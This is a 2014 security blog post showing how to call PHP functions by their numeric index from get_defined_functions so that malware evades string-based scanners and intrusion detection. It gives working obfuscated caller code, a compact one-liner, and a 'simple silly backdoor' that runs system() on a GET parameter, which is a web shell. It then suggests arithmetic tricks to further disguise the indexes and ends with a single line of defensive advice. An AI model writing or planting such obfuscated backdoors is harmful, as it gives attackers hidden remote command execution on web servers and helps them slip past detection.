---
title: Calling functions without their names in PHP
author: Jan Seidl
type: post
date: 2014-04-10T23:11:52+00:00
url: /posts/calling-functions-without-their-names-in-php/
categories:
  - Malware
tags:
  - backdoor
  - malware
  - obfuscation
  - php

---
Strings. Ah juicy and precious strings! It is common for malware scanners and IDPS to look for suspicious strings in network traffic and files&#8230; but what if there are no strings to look for? (whaaa?)

Today I was wondering about some features found in many interpreted languages of listing its internal functions in some sort of list/array. This way we can enumerate the `[index] => function_name` relationship, replace all `function_name`s on the code to their index and _voilá_!

You might ask: _&#8220;But you can just put those indexes on the rulesets.&#8221;_ I answer: _&#8220;Yes, that&#8217;s true&#8221;_. But different server/<acronym title="Pre-Hypertext Processing">PHP</acronym> configurations might generate the different indexes. Besides, numbers are much more fun to obfuscate than strings.

## <acronym title="Pre-Hypertext Processing">PHP</acronym>, because it&#8217;s widely used on the wild

I wasn&#8217;t remembering if <acronym title="Pre-Hypertext Processing">PHP</acronym> had this or not but I was pretty confident due to its nature. Turns out that [`get_defined_functions`](http://br1.php.net/get_defined_functions) is there as expected. With the aid of [`call_user_func_array`](http://br1.php.net/manual/en/function.call-user-func-array.php) it enabled the calling of functions without writing down their names in any encoded form (but it is required that you enumerate them beforehand).

## The Code

This snippet has fewer than 10 lines (and it&#8217;s optimized for readability) and is our indirect caller function.

{{< highlight php >}}
function callfunc() {

    $df = get_defined_functions(); # returns Array([internal] => Array([0] => zend_version....

    $args = func_get_args();
    $func_index = array_shift($args);
    $func_name = $df['internal'][$func_index];

    return call_user_func_array($func_name, $args);
}//end :: callfunc
{{< /highlight >}}

Then you can call your functions like this:

{{< highlight php >}}
/**
 * Depends on each server. Check it out with
 *  print_r(get_defined_functions());
 *
 * Some examples 
 * [544] => phpinfo
 * [639] => exec
 * [640] => system
 * [643] => passthru
 * [644] => shell_exec
 * [596] => str_replace
 */
callfunc(640, 'id'); # system('id')
print callfunc(639, 'uname -a'); # exec('uname -a')
print callfunc(596, "%body%", "black", "&lt;body text='%body%'&gt;"); # str_replace("%body%", "black", "&lt;body text='%body%'&gt;")
{{< /highlight >}}

### The output

Just for illustration:

{{< highlight bash >}}
uid=33(www-data) gid=33(www-data) groups=33(www-data) Linux guineapig 2.6.32-5-amd64 #1 SMP Mon Sep 23 22:14:43 UTC 2013 x86_64 GNU/Linux
{{< /highlight >}}


<h4>
  We can even make it a little more compact
</h4>


{{< highlight php >}}

function callfunc() {
    $df = get_defined_functions();
    $args = func_get_args();
    return call_user_func_array($df['internal'][array_shift($args)], $args);
}//end :: callfunc
{{< /highlight >}}


<h3>
  But Jan, there are still tree other internal function names exposed in your code. (func_get_args, call_user_func_array and array_shift)
</h3>


<p>
  Heck, you&#8217;re right. Let&#8217;s make this better.
</p>


{{< highlight php >}}

function callfunc() {
    $df = get_defined_functions();
    $args = $df['internal'][3]();
    return $df['internal'][734]($df['internal'][$df['internal'][982]($args)], $args);
}//end :: callfunc
{{< /highlight >}}


<p>
  or even&#8230;
</p>


{{< highlight php >}}

function callfunc() {
    $df = get_defined_functions(); 
    $df = $df['internal'];
    $args = $df[3]();
    return $df[734]($df[$df[982]($args)], $args);
}//end :: callfunc
{{< /highlight >}}


<h3>
  MOAR compact!
</h3>


{{< highlight php >}}

 function f(){$a=get_defined_functions();$a=$a['internal'];$b=$a[3]();return $a[734]($a[$a[982]($b)],$b);}
{{< /highlight >}}


<h3>
  A simple silly backdoor
</h3>


{{< highlight php >}}

# equiv. to system($_GET['cmd']);
 function f(){$a=get_defined_functions();$a=$a['internal'];$b=$a[3]();return $a[734]($a[$a[982]($b)],$b);};f(640, $_GET['cmd']);
{{< /highlight >}}


<h2>
  How the numbers could be obfuscated to bypass simple rules?
</h2>


<p>
  Well, with the very simple math stuff:
</p>


<ul>
  <li>
    XOR/AND/OR all entries: $index^$key, $index&#038;$key, $index|$key
  </li>
  
  
  <li>
    SUM/SUB/DIV/MUL all entries: $index+$key,$index-$key, $index/$key, $index*$key
  </li>
  
</ul>


<p>
  And so on.
</p>


<h2>
  So, what to do to prevent/catch those things?
</h2>


<p>
  Keep an eye for <code>get_defined_functions</code>.
</p>


<p>
  Cya!
</p>
